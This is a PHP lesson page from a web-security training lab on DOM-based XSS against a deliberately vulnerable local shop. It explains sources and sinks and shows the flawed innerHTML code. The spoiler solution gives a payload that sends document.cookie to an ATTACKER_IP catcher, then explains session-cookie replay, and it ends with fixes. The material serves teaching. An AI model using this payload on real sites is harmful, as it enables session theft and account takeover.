<?php
require __DIR__ . '/_layout.php';

$lessons = require __DIR__ . '/lessons.php';
$lesson  = $lessons['DOM_xss'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 06</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-medium"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('DOM_xss'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>

    <h3>What is XSS?</h3>
    <p>
        <strong>XSS</strong> stands for <strong>Cross-Site Scripting</strong>. It happens
        when a website accidentally lets an attacker inject their own JavaScript into a
        page that another user is viewing. The victim&apos;s browser sees that script
        as part of the trusted website- so it runs with full access to the
        victim&apos;s cookies, session, and anything the user can see or do on the
        site. In practical terms, a successful XSS often means the attacker can read
        the victim&apos;s session cookie and log in as them.
    </p>
    <p>
        There are three common flavours of XSS, and the difference is just
        <em>where the payload lives</em>:
    </p>
    <ul>
        <li><strong>Reflected XSS</strong>: the payload sits in a link the
            attacker sends the victim. The server echoes it back into the page (you
            already saw this on <code>home.php?msg=&hellip;</code>).</li>
        <li><strong>Stored XSS</strong>: the payload is saved on the server
            (e.g. in a product review) and served to every later visitor (you already
            saw this on the electronics product reviews).</li>
        <li><strong>DOM-based XSS</strong>: the payload never touches the
            server at all. It lives in a part of the URL the browser keeps to itself,
            and the page&apos;s own JavaScript is what puts it into the page.</li>
    </ul>
    <p class="academy-callout">
        This lab covers <strong>DOM-based XSS</strong>. The other two variants have
        their own labs: <a href="Reflected_xss.php">Reflected XSS</a> and
        <a href="Stored_xss.php">Stored XSS</a>. Each lab is self-contained, no
        particular order is required.
    </p>

    <h3>What does &quot;DOM-based&quot; mean?</h3>
    <p>
        The <strong>DOM</strong> (Document Object Model) is just the browser&apos;s
        live in-memory representation of the page- every element, attribute,
        and piece of text you can reach from JavaScript with things like
        <code>document.getElementById(&hellip;)</code> or
        <code>element.innerHTML</code>. When we say &quot;DOM-based XSS&quot;, we
        mean the whole bug plays out inside the browser&apos;s DOM, with no help from
        the server.
    </p>
    <p>
        Two pieces of jargon you&apos;ll see everywhere when reading about XSS:
    </p>
    <ul>
        <li>A <strong>source</strong> is any place attacker-controlled data can enter
            the page&apos;s JavaScript. The one we use here is
            <code>location.hash</code>- the part of the URL after <code>#</code>,
            which the attacker fully controls in the link they send the victim. Other
            common sources include <code>location.search</code> (the
            <code>?key=value</code> part), <code>document.referrer</code> (the page
            you came from), and <code>window.name</code>. You don&apos;t need to know
            them all - just &quot;anything the attacker can put in the URL or
            in a previous page.</li>
        <li>A <strong>sink</strong> is any place that data ends up where it might be
            interpreted as code. The big one is <code>element.innerHTML = &hellip;</code>,
            because the browser parses the string as HTML - including
            <code>&lt;script&gt;</code> tags and event handlers like
            <code>onerror</code>. Other dangerous sinks: <code>document.write()</code>,
            <code>eval()</code>, <code>setTimeout("&hellip;")</code> with a string.</li>
    </ul>
    <p>
        DOM XSS = attacker data flows from a <em>source</em> straight into a
        <em>sink</em> without being escaped on the way.
    </p>

    <h3>Why the URL fragment (<code>#&hellip;</code>) matters</h3>
    <p>
        Here is the part that makes DOM XSS sneakier than its siblings: browsers
        <strong>never send the part of a URL after <code>#</code> to the server</strong>.
        That part (called the &quot;fragment&quot;) was originally designed to point
        at a section anchor inside the same page, so the spec says it stays in the
        browser. That means a link like:
    </p>
    <pre><code>http://localhost/CyberProject/product_view.php?id=1#&lt;img src=x onerror=alert(1)&gt;</code></pre>
    <p>
        produces an HTTP request that looks completely innocent on the server side:
    </p>
    <pre><code>GET /CyberProject/product_view.php?id=1</code></pre>
    <p>
        No server log, no firewall, no <code>htmlspecialchars()</code> on the PHP
        side will ever see the payload. The malicious string only appears inside the
        victim&apos;s browser, where the page&apos;s own JavaScript reads it from
        <code>location.hash</code> and (if the code is buggy) writes it straight into
        the DOM.
    </p>
</section>

<!-- 2. TASK 1 - FIND THE SINK -->
<section class="academy-block">
    <h2>2. Task 1 - find the DOM sink</h2>
    <p>
        Browse the application and find a page that reads from the URL on the client
        and writes the value into the DOM. The tell-tale signs in DevTools are an
        element whose contents update when you change <code>#whatever</code> at the end
        of the URL, and an inline <code>&lt;script&gt;</code> that touches
        <code>location.hash</code> together with <code>innerHTML</code>.
    </p>
    <details class="academy-hint">
        <summary>Reveal the sink</summary>
        <p>
            The product page for items in the <strong>Snacks &amp; Pantry</strong>
            category renders a tab strip (Ingredients / Allergens / Nutrition). The
            currently selected tab is driven by the URL fragment, and the
            &quot;Showing section: &hellip;&quot; label is rendered with
            <code>innerHTML</code>:
        </p>
        <pre><code>// product_view.php (snacks_dry products only)
function applyHash() {
    var raw = location.hash.slice(1); // strip leading '#'
    if (!raw) { ... return; }

    // DOM XSS sink: attacker-controlled fragment written into innerHTML
    label.innerHTML = 'Showing section: ' + raw;
    ...
}
window.addEventListener('hashchange', applyHash);
applyHash();</code></pre>
        <p>
            <code>raw</code> comes straight from <code>location.hash</code>, which the
            attacker fully controls via the link they send. Concatenating it into
            <code>innerHTML</code> means any HTML in the fragment becomes live DOM.
        </p>
        <p>
            The tabs only render for <code>snacks_dry</code> products, so pick a snack
            product (e.g. <code>product_view.php?id=1</code>, Bamba) before testing
            payloads.
        </p>
    </details>
</section>

<!-- 3. TASK 2 - EXPLOIT THE SINK -->
<section class="academy-block">
    <h2>3. Task 2 - exploit the sink</h2>
    <ol>
        <li>Open a snacks product page and prove you can inject arbitrary HTML/JS by
            appending <code>#&lt;img src=x onerror=alert(1)&gt;</code> to the URL.</li>
        <li>Swap <code>alert(1)</code> for a payload that reads
            <code>document.cookie</code>, base64-encodes it, and ships it to
            <code>AttackerServer/catcher.php</code>.</li>
        <li>Confirm the catcher writes the stolen session cookie to
            <code>AttackerServer/stolen_cookies.txt</code>.</li>
        <li>
            <strong>Goal:</strong> harvest the victim&apos;s <code>PHPSESSID</code> via
            a link whose payload never appears in the target server&apos;s access log
            (because the fragment is client-side only)- then replay the cookie in
            another browser to log in as them.
        </li>
    </ol>
    <p>
        Treat the &quot;victim&quot; as a second logged-in browser session you open
        yourself.
    </p>
</section>

<!-- 4. START THE LAB -->
<section class="academy-block">
    <h2>4. Start the lab</h2>
    <p>
        Make sure you are already logged in on the target browser (e.g.
        <code>carlos</code> / <code>1234</code>). The lab page is the Bamba product
        view; the vulnerable sink is the tab-label element near the bottom of the page.
    </p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open vulnerable product page</a>
</section>

<!-- 5. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>Step 1 - prove the sink</h3>
        <p>Open this URL in a logged-in browser:</p>
        <pre><code>http://localhost/CyberProject/product_view.php?id=1#&lt;img src=x onerror=alert(1)&gt;</code></pre>
        <p>You get a browser alert. The &quot;Showing section: &hellip;&quot; label
            now contains a broken <code>&lt;img&gt;</code> whose <code>onerror</code>
            handler executed.</p>

        <h3>Step 2 - weaponise it</h3>
        <p>
            Same exfiltration trick as the reflected-XSS lab. <code>btoa()</code> turns
            the cookie into base64; navigating to the catcher fires a <code>GET</code>
            it logs:
        </p>
        <pre><code>&lt;img src=x onerror="document.location=
    'http://&lt;ATTACKER_IP&gt;/CyberProject/AttackerServer/catcher.php?data='
    + btoa(document.cookie)"&gt;</code></pre>

        <h3>Step 3 - build the link</h3>
        <p>
            Put the payload after <code>#</code> in the URL. Crucially: do
            <strong>not</strong> URL-encode the fragment. Browsers leave most special
            characters in the fragment alone, and the page&apos;s JavaScript reads
            <code>location.hash</code> verbatim - so the payload only needs to be
            valid HTML, not valid URL-encoded text.
        </p>

        <h3>Step 4 - the catcher</h3>
        <p>
            Identical to the reflected-XSS lab - the catcher just records the
            <code>data</code> query parameter.
        </p>
        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">View catcher.php</summary>
            <div class="academy-script" style="margin-top: 0.75rem;">
                <?php highlight_file(__DIR__ . '/../AttackerServer/catcher.php'); ?>
            </div>
        </details>

        <h3>Step 5 - replay the cookie</h3>
        <p>
            With the stolen <code>PHPSESSID</code>, open the site in a different
            browser, set the cookie via DevTools, and refresh <code>home.php</code>.
            You are now logged in as the victim.
        </p>

        <details style="margin-top: 1rem;">
            <summary style="cursor: pointer; font-weight: 600;">Bonus: automated exploit</summary>
            <p style="margin-top: 0.75rem;">
                Like the reflected-XSS builder, this script just assembles the URL- real exploitation still requires a human to click the link.
            </p>
            <div class="academy-script">
                <?php highlight_file(__DIR__ . '/../scripts/DOM_xss.py'); ?>
            </div>
        </details>

        <h3>Why DOM XSS is sneakier than reflected XSS</h3>
        <ul>
            <li>The payload lives <em>only</em> in the URL fragment, which browsers
                never send to the server. Web-server access logs and WAFs see a clean
                request (<code>GET /product_view.php?id=1</code>), not the malicious
                <code>#&lt;img&hellip;&gt;</code> portion.</li>
            <li>Server-side input sanitisation (<code>htmlspecialchars</code> on every
                <code>echo</code>) does nothing here, because the server is never
                handling the dangerous string. The vulnerability is purely in
                client-side code.</li>
        </ul>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li>Never concatenate untrusted strings into <code>innerHTML</code>. Use
                <code>textContent</code> (or <code>innerText</code>) when you only need
                to display text:
                <code>label.textContent = 'Showing section: ' + raw;</code></li>
            <li>Validate the fragment against an allow-list before using it
                (<code>['ingredients', 'allergens', 'nutrition']</code> in our case),
                and ignore anything else.</li>
            <li>Mark session cookies <code>HttpOnly</code> so even successful injection
                cannot read <code>document.cookie</code>.</li>
            <li>Add a Content Security Policy that forbids inline event handlers and
                unknown script origins.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>
